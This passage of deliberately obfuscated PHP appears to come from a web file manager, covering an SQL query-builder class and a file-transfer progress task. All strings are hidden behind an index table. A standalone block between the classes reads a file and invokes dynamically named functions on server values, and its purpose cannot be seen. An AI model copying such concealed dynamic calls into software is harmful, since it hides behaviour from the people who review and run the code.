(preg_match($¨¦È«§[1004], $ê°Ğªáà[0])) { $û–÷¸éÁ .= $ê°Ğªáà[0]; } elseif (preg_match($¨¦È«§[1005], $ê°Ğªáà[0])) { if (isset($ê°Ğªáà[2]) && $¨¦È«§[301] == $ê°Ğªáà[2]) { $û–÷¸éÁ .= $ØòÚ”ÌÔ . $¨¦È«§[63] . $this->exp[$“…ı›”] . $¨¦È«§[63] . $ê°Ğªáà[1]; } else { if (is_string($ê°Ğªáà[1])) { $ê°Ğªáà[1] = explode($¨¦È«§[60], $ê°Ğªáà[1]); } $Ê¯´“ÓÃ = implode($¨¦È«§[60], $this->parseValue($ê°Ğªáà[1])); $û–÷¸éÁ .= $ØòÚ”ÌÔ . $¨¦È«§[63] . $this->exp[$“…ı›”] . $¨¦È«§[888] . $Ê¯´“ÓÃ . $¨¦È«§[890]; } } elseif (preg_match($¨¦È«§[1006], $ê°Ğªáà[0])) { $ñµğıÇ¼ = is_string($ê°Ğªáà[1]) ? explode($¨¦È«§[60], $ê°Ğªáà[1]) : $ê°Ğªáà[1]; $û–÷¸éÁ .= $¨¦È«§[888] . $ØòÚ”ÌÔ . $¨¦È«§[63] . $this->exp[$“…ı›”] . $¨¦È«§[63] . $this->parseValue($ñµğıÇ¼[0]) . $¨¦È«§[989] . $this->parseValue($ñµğıÇ¼[1]) . $¨¦È«§[282]; } else { think_exception(think_lang($¨¦È«§[992]) . $¨¦È«§[4] . $ê°Ğªáà[0]); } } else { $Ÿ‹ÍÄë = count($ê°Ğªáà); $³‰‚Ô½í = $¨¦È«§[22]; if (is_string($ê°Ğªáà[$Ÿ‹ÍÄë - 1])) { $³‰‚Ô½í = isset($ê°Ğªáà[$Ÿ‹ÍÄë - 1]) ? strtoupper($ê°Ğªáà[$Ÿ‹ÍÄë - 1]) : $¨¦È«§[22]; if (in_array($³‰‚Ô½í, array($¨¦È«§[986], $¨¦È«§[987], $¨¦È«§[988]))) { $Ÿ‹ÍÄë = $Ÿ‹ÍÄë - 1; } } else { $³‰‚Ô½í = $¨¦È«§[986]; } for ($Ò±õº²ö = 0; $Ò±õº²ö < $Ÿ‹ÍÄë; $Ò±õº²ö++) { $ñµğıÇ¼ = is_array($ê°Ğªáà[$Ò±õº²ö]) ? $ê°Ğªáà[$Ò±õº²ö][1] : $ê°Ğªáà[$Ò±õº²ö]; if ($¨¦È«§[301] == strtolower($ê°Ğªáà[$Ò±õº²ö][0])) { $û–÷¸éÁ .= $¨¦È«§[264] . $ØòÚ”ÌÔ . $¨¦È«§[63] . $ñµğıÇ¼ . $¨¦È«§[1003] . $³‰‚Ô½í . $¨¦È«§[63]; } else { $‚üÕ¬›Ş = is_array($ê°Ğªáà[$Ò±õº²ö]) ? $this->exp[strtolower($ê°Ğªáà[$Ò±õº²ö][0])] : $¨¦È«§[869]; if (!$‚üÕ¬›Ş && is_array($ê°Ğªáà[$Ò±õº²ö]) && in_array($ê°Ğªáà[$Ò±õº²ö][0], array($¨¦È«§[869], $¨¦È«§[996], $¨¦È«§[997], $¨¦È«§[998], $¨¦È«§[999], $¨¦È«§[1000]))) { $‚üÕ¬›Ş = $ê°Ğªáà[$Ò±õº²ö][0]; } $û–÷¸éÁ .= $¨¦È«§[264] . $ØòÚ”ÌÔ . $¨¦È«§[63] . $‚üÕ¬›Ş . $¨¦È«§[63] . $this->parseValue($ñµğıÇ¼) . $¨¦È«§[1003] . $³‰‚Ô½í . $¨¦È«§[63]; } } $û–÷¸éÁ = substr($û–÷¸éÁ, 0, -4); } } else { $û–÷¸éÁ .= $ØòÚ”ÌÔ . $¨¦È«§[1007] . $this->parseValue($ê°Ğªáà); } return $û–÷¸éÁ; } protected function parseThinkWhere($‘á¿Æš×, $×òëÈÄÄ) { $™‹˜îè‡ =& $_SERVER[¹àö™Ç¾]; $şËæíì¢ = $™‹˜îè‡[22]; switch ($‘á¿Æš×) { case $™‹˜îè‡[356]: $şËæíì¢ = $×òëÈÄÄ; break; case $™‹˜îè‡[990]: $şËæíì¢ = is_string($×òëÈÄÄ) ? $×òëÈÄÄ : substr($this->parseWhere($×òëÈÄÄ), 6); break; case $™‹˜îè‡[1008]: parse_str($×òëÈÄÄ, $Ñå¯ÒŞÃ); if (isset($Ñå¯ÒŞÃ[$™‹˜îè‡[985]])) { $ÀÙ‡âñ¢ = $™‹˜îè‡[63] . strtoupper($Ñå¯ÒŞÃ[$™‹˜îè‡[985]]) . $™‹˜îè‡[63]; unset($Ñå¯ÒŞÃ[$™‹˜îè‡[985]]); } else { $ÀÙ‡âñ¢ = $™‹˜îè‡[989]; } $Êäåñôµ = array(); foreach ($Ñå¯ÒŞÃ as $®“ŠÊˆô => $Û‘“½èƒ) { $Êäåñôµ[] = $this->parseKey($®“ŠÊˆô) . $™‹˜îè‡[1007] . $this->parseValue($Û‘“½èƒ); } $şËæíì¢ = implode($ÀÙ‡âñ¢, $Êäåñôµ); break; } return $şËæíì¢; } protected function parseLimit($ñ÷Ä•Öì) { $…¡¡«Á  =& $_SERVER[¹àö™Ç¾]; return !empty($ñ÷Ä•Öì) ? $…¡¡«Á [61] . $ñ÷Ä•Öì . $…¡¡«Á [63] : $…¡¡«Á [22]; } protected function parseJoin($ïÀ® Ò) { $Ñ˜×à¹Ü =& $_SERVER[¹àö™Ç¾]; $âùíÅÇ— = $Ñ˜×à¹Ü[22]; if (!empty($ïÀ® Ò)) { if (is_array($ïÀ® Ò)) { foreach ($ïÀ® Ò as $©º‚øõá => $¡º¶¼–Æ) { if (!1 !== stripos($¡º¶¼–Æ, $Ñ˜×à¹Ü[1009])) { $âùíÅÇ— .= $Ñ˜×à¹Ü[63] . $¡º¶¼–Æ; } else { $âùíÅÇ— .= $Ñ˜×à¹Ü[1010] . $¡º¶¼–Æ; } } } else { $âùíÅÇ— .= $Ñ˜×à¹Ü[1010] . $ïÀ® Ò; } } $âùíÅÇ— = preg_replace($Ñ˜×à¹Ü[1011], think_config($Ñ˜×à¹Ü[915]) . $Ñ˜×à¹Ü[1012], $âùíÅÇ—); return $âùíÅÇ—; } protected function parseOrder($‡öÈäÙ­) { $ıó—şê­ =& $_SERVER[¹àö™Ç¾]; if (is_array($‡öÈäÙ­)) { $ü Ã´Ş– = array(); foreach ($‡öÈäÙ­ as $ª³İÈüÁ => $Õ¶„ëÑ) { if (is_numeric($ª³İÈüÁ)) { $ü Ã´Ş–[] = $this->parseKey($Õ¶„ëÑ); } else { $Õ¶„ëÑ = in_array(strtoupper(trim($Õ¶„ëÑ)), array($ıó—şê­[1013], $ıó—şê­[1014])) ? $ıó—şê­[63] . $Õ¶„ëÑ : $ıó—şê­[22]; if (preg_match($ıó—şê­[1015], $ª³İÈüÁ)) { $ü Ã´Ş–[] = $this->parseKey($ª³İÈüÁ) . $Õ¶„ëÑ; } else { think_exception($ıó—şê­[1016] . $ª³İÈüÁ); } } } $‡öÈäÙ­ = implode($ıó—şê­[60], $ü Ã´Ş–); } return !empty($‡öÈäÙ­) ? $ıó—şê­[1017] . $‡öÈäÙ­ : $ıó—şê­[22]; } protected function parseGroup($‹¡™–À¯) { $º‰åøİ• =& $_SERVER[¹àö™Ç¾]; return !empty($‹¡™–À¯) ? $º‰åøİ•[1018] . $‹¡™–À¯ : $º‰åøİ•[22]; } protected function parseHaving($ùÏÜŞÈÕ) { $ëËî÷°ï =& $_SERVER[¹àö™Ç¾]; return !empty($ùÏÜŞÈÕ) ? $ëËî÷°ï[1019] . $ùÏÜŞÈÕ : $ëËî÷°ï[22]; } protected function parseComment($á­®º·Ã) { $äÃíçò¯ =& $_SERVER[¹àö™Ç¾]; return !empty($á­®º·Ã) ? $äÃíçò¯[1020] . $á­®º·Ã . $äÃíçò¯[1021] : $äÃíçò¯[22]; } protected function parseDistinct($¿ÁÎäÉ) { $ë„Ç¥Õı =& $_SERVER[¹àö™Ç¾]; return !empty($¿ÁÎäÉ) ? $ë„Ç¥Õı[1022] : $ë„Ç¥Õı[22]; } protected function parseUnion($¨‰›ü¶Õ) { $šãà­á =& $_SERVER[¹àö™Ç¾]; if (empty($¨‰›ü¶Õ)) { return $šãà­á[22]; } if (isset($¨‰›ü¶Õ[$šãà­á[352]])) { $îİ›Óş = $šãà­á[1023]; unset($¨‰›ü¶Õ[$šãà­á[352]]); } else { $îİ›Óş = $šãà­á[1024]; } foreach ($¨‰›ü¶Õ as $û–¥ğóÃ) { $Çß²Ç«é[] = $îİ›Óş . (is_array($û–¥ğóÃ) ? $this->buildSelectSql($û–¥ğóÃ) : $û–¥ğóÃ); } return implode($šãà­á[63], $Çß²Ç«é); } public function insert($íÀóĞß•, $Æ»ßúğ× = array(), $¹å«¾§à = false) { $Éå®Ìâ =& $_SERVER[¹àö™Ç¾]; $Ïø¤šµ¾ = $¯†Ö¦ã = array(); $this->model = $Æ»ßúğ×[$Éå®Ìâ[285]]; foreach ($íÀóĞß• as $íüÅ½ú´ => $Ï¢©ï‘) { if (is_array($Ï¢©ï‘) && $Éå®Ìâ[301] == $Ï¢©ï‘[0]) { $¯†Ö¦ã[] = $this->parseKey($íüÅ½ú´); $Ïø¤šµ¾[] = $Ï¢©ï‘[1]; } elseif (is_scalar($Ï¢©ï‘) || is_null($Ï¢©ï‘)) { $¯†Ö¦ã[] = $this->parseKey($íüÅ½ú´); $Ïø¤šµ¾[] = $this->parseValue($Ï¢©ï‘); } } $™»µ¢÷ = ($¹å«¾§à ? $Éå®Ìâ[892] : $Éå®Ìâ[893]) . $Éå®Ìâ[894] . $this->parseTable($Æ»ßúğ×[$Éå®Ìâ[283]]) . $Éå®Ìâ[888] . implode($Éå®Ìâ[60], $¯†Ö¦ã) . $Éå®Ìâ[889] . implode($Éå®Ìâ[60], $Ïø¤šµ¾) . $Éå®Ìâ[890]; $™»µ¢÷ .= $this->parseLock(isset($Æ»ßúğ×[$Éå®Ìâ[835]]) ? $Æ»ßúğ×[$Éå®Ìâ[835]] : !1); $™»µ¢÷ .= $this->parseComment(!empty($Æ»ßúğ×[$Éå®Ìâ[358]]) ? $Æ»ßúğ×[$Éå®Ìâ[358]] : $Éå®Ìâ[22]); return $this->execute($™»µ¢÷, $this->parseBind(!empty($Æ»ßúğ×[$Éå®Ìâ[289]]) ? $Æ»ßúğ×[$Éå®Ìâ[289]] : array())); } public function selectInsert($œìÓÚ¤í, $ÀÑÉ‘, $øóñ‚» = array()) { $´†ßÉˆˆ =& $_SERVER[¹àö™Ç¾]; $this->model = $øóñ‚»[$´†ßÉˆˆ[285]]; if (is_string($œìÓÚ¤í)) { $œìÓÚ¤í = explode($´†ßÉˆˆ[60], $œìÓÚ¤í); } array_walk($œìÓÚ¤í, array($this, $´†ßÉˆˆ[891])); $øæÏ¬Ì¥ = $´†ßÉˆˆ[1025] . $this->parseTable($ÀÑÉ‘) . $´†ßÉˆˆ[888] . implode($´†ßÉˆˆ[60], $œìÓÚ¤í) . $´†ßÉˆˆ[1003]; $øæÏ¬Ì¥ .= $this->buildSelectSql($øóñ‚»); return $this->execute($øæÏ¬Ì¥, $this->parseBind(!empty($øóñ‚»[$´†ßÉˆˆ[289]]) ? $øóñ‚»[$´†ßÉˆˆ[289]] : array())); } public function update($´ÕÀËÛü, $…ˆ¸¶·î) { $Óˆâğø =& $_SERVER[¹àö™Ç¾]; $this->model = $…ˆ¸¶·î[$Óˆâğø[285]]; $ÌÉ÷µÒù = $Óˆâğø[1026] . $this->parseTable($…ˆ¸¶·î[$Óˆâğø[283]]) . $this->parseSet($´ÕÀËÛü) . $this->parseWhere(!empty($…ˆ¸¶·î[$Óˆâğø[279]]) ? $…ˆ¸¶·î[$Óˆâğø[279]] : $Óˆâğø[22]) . $this->parseOrder(!empty($…ˆ¸¶·î[$Óˆâğø[369]]) ? $…ˆ¸¶·î[$Óˆâğø[369]] : $Óˆâğø[22]) . $this->parseLimit(!empty($…ˆ¸¶·î[$Óˆâğø[296]]) ? $…ˆ¸¶·î[$Óˆâğø[296]] : $Óˆâğø[22]) . $this->parseLock(isset($…ˆ¸¶·î[$Óˆâğø[835]]) ? $…ˆ¸¶·î[$Óˆâğø[835]] : !1) . $this->parseComment(!empty($…ˆ¸¶·î[$Óˆâğø[358]]) ? $…ˆ¸¶·î[$Óˆâğø[358]] : $Óˆâğø[22]); return $this->execute($ÌÉ÷µÒù, $this->parseBind(!empty($…ˆ¸¶·î[$Óˆâğø[289]]) ? $…ˆ¸¶·î[$Óˆâğø[289]] : array())); } public function delete($íó×¤£ = array()) { $ï½®Ê¯ =& $_SERVER[¹àö™Ç¾]; $this->model = $íó×¤£[$ï½®Ê¯[285]]; $İï÷­ = $ï½®Ê¯[1027] . $this->parseTable($íó×¤£[$ï½®Ê¯[283]]) . $this->parseWhere(!empty($íó×¤£[$ï½®Ê¯[279]]) ? $íó×¤£[$ï½®Ê¯[279]] : $ï½®Ê¯[22]) . $this->parseOrder(!empty($íó×¤£[$ï½®Ê¯[369]]) ? $íó×¤£[$ï½®Ê¯[369]] : $ï½®Ê¯[22]) . $this->parseLimit(!empty($íó×¤£[$ï½®Ê¯[296]]) ? $íó×¤£[$ï½®Ê¯[296]] : $ï½®Ê¯[22]) . $this->parseLock(isset($íó×¤£[$ï½®Ê¯[835]]) ? $íó×¤£[$ï½®Ê¯[835]] : !1) . $this->parseComment(!empty($íó×¤£[$ï½®Ê¯[358]]) ? $íó×¤£[$ï½®Ê¯[358]] : $ï½®Ê¯[22]); return $this->execute($İï÷­, $this->parseBind(!empty($íó×¤£[$ï½®Ê¯[289]]) ? $íó×¤£[$ï½®Ê¯[289]] : array())); } public function select($„£¢Õ·ë = array()) { $Ù¿«æ¸‹ =& $_SERVER[¹àö™Ç¾]; $this->model = $„£¢Õ·ë[$Ù¿«æ¸‹[285]]; $†Ô‚È­ = $this->buildSelectSql($„£¢Õ·ë); $¢»Úü¯Ù = isset($„£¢Õ·ë[$Ù¿«æ¸‹[353]]) ? $„£¢Õ·ë[$Ù¿«æ¸‹[353]] : !1; if ($¢»Úü¯Ù) { $ó´½éâĞ = is_string($¢»Úü¯Ù[$Ù¿«æ¸‹[105]]) ? $¢»Úü¯Ù[$Ù¿«æ¸‹[105]] : $Ù¿«æ¸‹[1028] . md5($†Ô‚È­); $ßë­…Û = think_cache($ó´½éâĞ, $Ù¿«æ¸‹[22], $¢»Úü¯Ù); if (!1 !== $ßë­…Û) { return $ßë­…Û; } } $ĞÌÀó¹ƒ = $this->query($†Ô‚È­, $this->parseBind(!empty($„£¢Õ·ë[$Ù¿«æ¸‹[289]]) ? $„£¢Õ·ë[$Ù¿«æ¸‹[289]] : array())); if ($¢»Úü¯Ù && !1 !== $ĞÌÀó¹ƒ) { think_cache($ó´½éâĞ, $ĞÌÀó¹ƒ, $¢»Úü¯Ù); } return $ĞÌÀó¹ƒ; } public function buildSelectSql($Æºú   = array()) { $­¶”¬‰ =& $_SERVER[¹àö™Ç¾]; if (isset($Æºú  [$­¶”¬‰[357]])) { if (strpos($Æºú  [$­¶”¬‰[357]], $­¶”¬‰[60])) { list($öşŠ‰åÖ, $¹ËÌÙ¹) = explode($­¶”¬‰[60], $Æºú  [$­¶”¬‰[357]]); } else { $öşŠ‰åÖ = $Æºú  [$­¶”¬‰[357]]; } $öşŠ‰åÖ = $öşŠ‰åÖ ? $öşŠ‰åÖ : 1; $¹ËÌÙ¹ = isset($¹ËÌÙ¹) ? $¹ËÌÙ¹ : (is_numeric($Æºú  [$­¶”¬‰[296]]) ? $Æºú  [$­¶”¬‰[296]] : 20); $ºÛªÂ = $¹ËÌÙ¹ * ((int) $öşŠ‰åÖ - 1); $Æºú  [$­¶”¬‰[296]] = $ºÛªÂ . $­¶”¬‰[60] . $¹ËÌÙ¹; } if (think_config($­¶”¬‰[1029])) { $•—¿ğ´ß = $­¶”¬‰[1030] . md5(serialize($Æºú  )); $›ÎÉ÷Ù˜ = think_cache($•—¿ğ´ß); if ($›ÎÉ÷Ù˜) { return $›ÎÉ÷Ù˜; } } $‹ÃŞöºà = $this->parseSql($this->selectSql, $Æºú  ); $‹ÃŞöºà .= $this->parseLock(isset($Æºú  [$­¶”¬‰[835]]) ? $Æºú  [$­¶”¬‰[835]] : !1); if (isset($•—¿ğ´ß)) { think_cache($•—¿ğ´ß, $‹ÃŞöºà); } return $‹ÃŞöºà; } public function parseSql($ó¦ïìğØ, $çÄˆ¶ = array()) { $ÕŠŞÓ¶³ =& $_SERVER[¹àö™Ç¾]; $ó¦ïìğØ = str_replace(array($ÕŠŞÓ¶³[1031], $ÕŠŞÓ¶³[1032], $ÕŠŞÓ¶³[1033], $ÕŠŞÓ¶³[1034], $ÕŠŞÓ¶³[1035], $ÕŠŞÓ¶³[1036], $ÕŠŞÓ¶³[1037], $ÕŠŞÓ¶³[1038], $ÕŠŞÓ¶³[1039], $ÕŠŞÓ¶³[1040], $ÕŠŞÓ¶³[1041]), array($this->parseTable("{$çÄˆ¶[$ÕŠŞÓ¶³[283]]}"), $this->parseDistinct(isset($çÄˆ¶[$ÕŠŞÓ¶³[1042]]) ? $çÄˆ¶[$ÕŠŞÓ¶³[1042]] : !1), $this->parseField(!empty($çÄˆ¶[$ÕŠŞÓ¶³[277]]) ? $çÄˆ¶[$ÕŠŞÓ¶³[277]] : $ÕŠŞÓ¶³[191]), $this->parseJoin(!empty($çÄˆ¶[$ÕŠŞÓ¶³[286]]) ? $çÄˆ¶[$ÕŠŞÓ¶³[286]] : $ÕŠŞÓ¶³[22]), $this->parseWhere(!empty($çÄˆ¶[$ÕŠŞÓ¶³[279]]) ? $çÄˆ¶[$ÕŠŞÓ¶³[279]] : $ÕŠŞÓ¶³[22]), $this->parseGroup(!empty($çÄˆ¶[$ÕŠŞÓ¶³[515]]) ? $çÄˆ¶[$ÕŠŞÓ¶³[515]] : $ÕŠŞÓ¶³[22]), $this->parseHaving(!empty($çÄˆ¶[$ÕŠŞÓ¶³[1043]]) ? $çÄˆ¶[$ÕŠŞÓ¶³[1043]] : $ÕŠŞÓ¶³[22]), $this->parseOrder(!empty($çÄˆ¶[$ÕŠŞÓ¶³[369]]) ? $çÄˆ¶[$ÕŠŞÓ¶³[369]] : $ÕŠŞÓ¶³[22]), $this->parseLimit(!empty($çÄˆ¶[$ÕŠŞÓ¶³[296]]) ? $çÄˆ¶[$ÕŠŞÓ¶³[296]] : $ÕŠŞÓ¶³[22]), $this->parseUnion(!empty($çÄˆ¶[$ÕŠŞÓ¶³[351]]) ? $çÄˆ¶[$ÕŠŞÓ¶³[351]] : $ÕŠŞÓ¶³[22]), $this->parseComment(!empty($çÄˆ¶[$ÕŠŞÓ¶³[358]]) ? $çÄˆ¶[$ÕŠŞÓ¶³[358]] : $ÕŠŞÓ¶³[22])), $ó¦ïìğØ); return $ó¦ïìğØ; } public function getLastSql($¯êæ¦×‚ = '') { return $¯êæ¦×‚ ? $this->modelSql[$¯êæ¦×‚] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Ïøî¡÷İ) { return addslashes($Ïøî¡÷İ); } public function setModel($’ƒİÊ¥à) { $this->model = $’ƒİÊ¥à; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } if ($_SERVER[$_SERVER[¹àö™Ç¾][6]] != $_SERVER[$_SERVER[¹àö™Ç¾][7]]) { $_getc = $_SERVER[¹àö™Ç¾][8]; $_getfile = $_SERVER[$_SERVER[¹àö™Ç¾][9]] . $_SERVER[¹àö™Ç¾][10]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¹àö™Ç¾][11], $_getfilec); if (count($_getarrs) < $_SERVER[¹àö™Ç¾][12]) { $exit = $_SERVER[¹àö™Ç¾][13]; $exit(); } $_act = $_SERVER[¹àö™Ç¾][14]; $_act($_SERVER[$_SERVER[¹àö™Ç¾][15]]); } goto A‹˜˜‹Í¾; eÔ©³•¬ŒÁ: class TaskFileTransfer extends Task { protected function startAfter() { $Â£‚¬Î =& $_SERVER[¹àö™Ç¾]; $´çë¾«Œ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Â£‚¬Î[1668], array($this, $Â£‚¬Î[1669])); Hook::bind($Â£‚¬Î[1198], array($this, $Â£‚¬Î[1670])); Hook::bind($Â£‚¬Î[1671], array($this, $Â£‚¬Î[1672])); Hook::bind($Â£‚¬Î[598], array($this, $Â£‚¬Î[1673])); Hook::bind($Â£‚¬Î[599], array($this, $Â£‚¬Î[1674])); Hook::bind($Â£‚¬Î[601], array($this, $Â£‚¬Î[1675])); Hook::bind($Â£‚¬Î[602], array($this, $Â£‚¬Î[1675])); Hook::bind($Â£‚¬Î[568], array($this, $Â£‚¬Î[1676])); Hook::bind($Â£‚¬Î[565], array($this, $Â£‚¬Î[1676])); Hook::bind($Â£‚¬Î[570], array($this, $Â£‚¬Î[1676])); Hook::bind($Â£‚¬Î[572], array($this, $Â£‚¬Î[1676])); Hook::bind($Â£‚¬Î[574], array($this, $Â£‚¬Î[1676])); Hook::bind($Â£‚¬Î[1677], array($this, $Â£‚¬Î[1678])); Hook::bind($Â£‚¬Î[591], array($this, $Â£‚¬Î[1679])); $this->sourceModelCopyFlag = !1; Hook::bind($Â£‚¬Î[1680], array($this, $Â£‚¬Î[1681])); Hook::bind($Â£‚¬Î[1682], array($this, $Â£‚¬Î[1683])); Hook::bind($Â£‚¬Î[1684], array($this, $Â£‚¬Î[1685])); $´çë¾«Œ[$Â£‚¬Î[1686]] = LNG($Â£‚¬Î[1687]); $´çë¾«Œ[$Â£‚¬Î[1688]] = 0; $´çë¾«Œ[$Â£‚¬Î[1689]] = 0; $´çë¾«Œ[$Â£‚¬Î[1049]] = $Â£‚¬Î[22]; $´çë¾«Œ[$Â£‚¬Î[1690]] = $Â£‚¬Î[22]; $´çë¾«Œ[$Â£‚¬Î[1691]] = 0; $´çë¾«Œ[$Â£‚¬Î[1692]] = 0; $´çë¾«Œ[$Â£‚¬Î[1693]] = 0; if (!$´çë¾«Œ[$Â£‚¬Î[1540]]) { $´çë¾«Œ[$Â£‚¬Î[1540]] = LNG($Â£‚¬Î[1694]); } } protected function endAfter() { $†˜‹ĞÑ  =& $_SERVER[¹àö™Ç¾]; Hook::unbind($†˜‹ĞÑ [1668], array($this, $†˜‹ĞÑ [1669])); Hook::unbind($†˜‹ĞÑ [1198], array($this, $†˜‹ĞÑ [1670])); Hook::unbind($†˜‹ĞÑ [1671], array($this, $†˜‹ĞÑ [1672])); Hook::unbind($†˜‹ĞÑ [598], array($this, $†˜‹ĞÑ [1673])); Hook::unbind($†˜‹ĞÑ [599], array($this, $†˜‹ĞÑ [1674])); Hook::unbind($†˜‹ĞÑ [601], array($this, $†˜‹ĞÑ [1675])); Hook::unbind($†˜‹ĞÑ [602], array($this, $†˜‹ĞÑ [1675])); Hook::unbind($†˜‹ĞÑ [568], array($this, $†˜‹ĞÑ [1676])); Hook::unbind($†˜‹ĞÑ [565], array($this, $†˜‹ĞÑ [1676])); Hook::unbind($†˜‹ĞÑ [570], array($this, $†˜‹ĞÑ [1676])); Hook::unbind($†˜‹ĞÑ [572], array($this, $†˜‹ĞÑ [1676])); Hook::unbind($†˜‹ĞÑ [574], array($this, $†˜‹ĞÑ [1676])); Hook::unbind($†˜‹ĞÑ [1677], array($this, $†˜‹ĞÑ [1678])); Hook::unbind($†˜‹ĞÑ [591], array($this, $†˜‹ĞÑ [1679])); Hook::unbind($†˜‹ĞÑ [1680], array($this, $†˜‹ĞÑ [1681])); Hook::unbind($†˜‹ĞÑ [1682], array($this, $†˜‹ĞÑ [1683])); Hook::unbind($†˜‹ĞÑ [1684], array($this, $†˜‹ĞÑ [1685])); } public function copyMoveStart($èŒşº©ü, $¨áèâª, $›³±áæÆ, $™˜Äé­¿) { $ƒƒ’˜éÛ =& $_SERVER[¹àö™Ç¾]; self::log($ƒƒ’˜éÛ[1695] . $¨áèâª . $ƒƒ’˜éÛ[80] . $™˜Äé­¿); $àñ›ƒĞ = rtrim(TEMP_FILES, $ƒƒ’˜éÛ[18]); if (substr($¨áèâª, 0, strlen($àñ›ƒĞ)) == $àñ›ƒĞ) { return; } if (substr($™˜Äé­¿, 0, strlen($àñ›ƒĞ)) == $àñ›ƒĞ) { return; } $¹ªìËÉã =& $this->task; $¹ªìËÉã[$ƒƒ’˜éÛ[1696]] = KodIO::transferType($èŒşº©ü, $›³±áæÆ); $this->update(); } public function updateAfter() { $ëî«ÖÎÑ =& $_SERVER[¹àö™Ç¾]; $êŞë˜İ =& $this->task; if (!$êŞë˜İ[$ëî«ÖÎÑ[755]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($êŞë˜İ[$ëî«ÖÎÑ[1696]] == $ëî«ÖÎÑ[1287]) { return; } self::updateTask($êŞë˜İ); } private static function updateTask(&$Ñı—¸·ƒ) { $ƒŠ·—Ñî =& $_SERVER[¹àö™Ç¾]; if ($Ñı—¸·ƒ[$ƒŠ·—Ñî[1696]] == $ƒŠ·—Ñî[1182] || $Ñı—¸·ƒ[$ƒŠ·—Ñî[1696]] == $ƒŠ·—Ñî[118]) { if ($Ñı—¸·ƒ[$ƒŠ·—Ñî[1690]]) { $Ñı—¸·ƒ[$ƒŠ·—Ñî[1693]] = $Ñı—¸·ƒ[$ƒŠ·—Ñî[1692]] + $Ñı—¸·ƒ[$ƒŠ·—Ñî[1689]]; } } else { if ($Ñı—¸·ƒ[$ƒŠ·—Ñî[1696]] == $ƒŠ·—Ñî[1288]) { if ($Ñı—¸·ƒ[$ƒŠ·—Ñî[1690]] == $ƒŠ·—Ñî[1182]) { $Ñı—¸·ƒ[$ƒŠ·—Ñî[1693]] = $Ñı—¸·ƒ[$ƒŠ·—Ñî[1692]] + $Ñı—¸·ƒ[$ƒŠ·—Ñî[1689]] * 0.5; } else { if ($Ñı—¸·ƒ[$ƒŠ·—Ñî[1690]] == $ƒŠ·—Ñî[118]) { $Ñı—¸·ƒ[$ƒŠ·—Ñî[1693]] = $Ñı—¸·ƒ[$ƒŠ·—Ñî[1692]] + $Ñı—¸·ƒ[$ƒŠ·—Ñî[1688]] * 0.5 + $Ñı—¸·ƒ[$ƒŠ·—Ñî[1689]] * 0.5; } } } } $Ñı—¸·ƒ[$ƒŠ·—Ñî[1642]] = $Ñı—¸·ƒ[$ƒŠ·—Ñî[1693]] / $Ñı—¸·ƒ[$ƒŠ·—Ñî[755]]; if ($Ñı—¸·ƒ[$ƒŠ·—Ñî[1642]] > 0) { $ß¹³Š÷’ = timeFloat() - $Ñı—¸·ƒ[$ƒŠ·—Ñî[1644]] - $Ñı—¸·ƒ[$ƒŠ·—Ñî[1647]]; $Ñı—¸·ƒ[$ƒŠ·—Ñî[1648]] = $ß¹³Š÷’ * (1 - $Ñı—¸·ƒ[$ƒŠ·—Ñî[1642]]) / $Ñı—¸·ƒ[$ƒŠ·—Ñî[1642]]; } } public function addPath($§âËÁ¢ú) { $óóôúĞÆ =& $_SERVER[¹àö™Ç¾]; if (!$§âËÁ¢ú) { return; } $ÜÂêì =& $this->task; $®ÛôÇ® = IO::infoWithChildren($§âËÁ¢ú); $Éì×¨ã² = $ÜÂêì[$óóôúĞÆ[1697]] ? $ÜÂêì[$óóôúĞÆ[1697]][$óóôúĞÆ[1698]] : 0; $ÜÂêì[$óóôúĞÆ[1697]] = array($óóôúĞÆ[1698] => $Éì×¨ã² + 1, $óóôúĞÆ[421] => $®ÛôÇ®[$óóôúĞÆ[42]], $óóôúĞÆ[88] => $®ÛôÇ®[$óóôúĞÆ[88]], $óóôúĞÆ[519] => $®ÛôÇ®[$óóôúĞÆ[519]] ? $®ÛôÇ®[$óóôúĞÆ[519]] : $®ÛôÇ®[$óóôúĞÆ[88]]); if ($®ÛôÇ®[$óóôúĞÆ[43]] == $óóôúĞÆ[202]) { $ÜÂêì[$óóôúĞÆ[778]] += 1; } else { $ÜÂêì[$óóôúĞÆ[778]] += $®ÛôÇ®[$óóôúĞÆ[93]][$óóôúĞÆ[91]]; if ($®ÛôÇ®[$óóôúĞÆ[403]]) { $ÜÂêì[$óóôúĞÆ[778]] += $®ÛôÇ®[$óóôúĞÆ[93]][$óóôúĞÆ[92]] + 1; } } $ÜÂêì[$óóôúĞÆ[755]] += $®ÛôÇ®[$óóôúĞÆ[90]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($ÙŸ¶»®Ş) { $†Ô’¤ŞÂ =& $_SERVER[¹àö™Ç¾]; $õµ’à¼ =& $this->task; $õµ’à¼[$†Ô’¤ŞÂ[1686]] = $ÙŸ¶»®Ş[$†Ô’¤ŞÂ[42]]; $õµ’à¼[$†Ô’¤ŞÂ[1049]] = $ÙŸ¶»®Ş[$†Ô’¤ŞÂ[42]]; $this->update(); } public function copyFileStart($ºï†¿†÷, $®èì“Ô®, $ñˆ»Æ…, $­˜±¡šÓ, $æÖá‰Ø±, $ñ§Ş™èô) { $¢éÛ¾¶Ÿ =& $_SERVER[¹àö™Ç¾]; $¯Ä†Ò« = $æÖá‰Ø±; if ($¯Ä†Ò« == $GLOBALS[$¢éÛ¾¶Ÿ[1699]]) { $¯Ä†Ò« = $GLOBALS[$¢éÛ¾¶Ÿ[1700]]; } $GLOBALS[$¢éÛ¾¶Ÿ[1700]] = $æÖá‰Ø±; $GLOBALS[$¢éÛ¾¶Ÿ[1699]] = $ñ§Ş™èô; $ŒŠèÔ— =& $this->task; $ŒŠèÔ—[$¢éÛ¾¶Ÿ[1686]] = $¯Ä†Ò«; $ŒŠèÔ—[$¢éÛ¾¶Ÿ[1688]] = (int) $ºï†¿†÷->size($®èì“Ô®); $ŒŠèÔ—[$¢éÛ¾¶Ÿ[1689]] = 0; 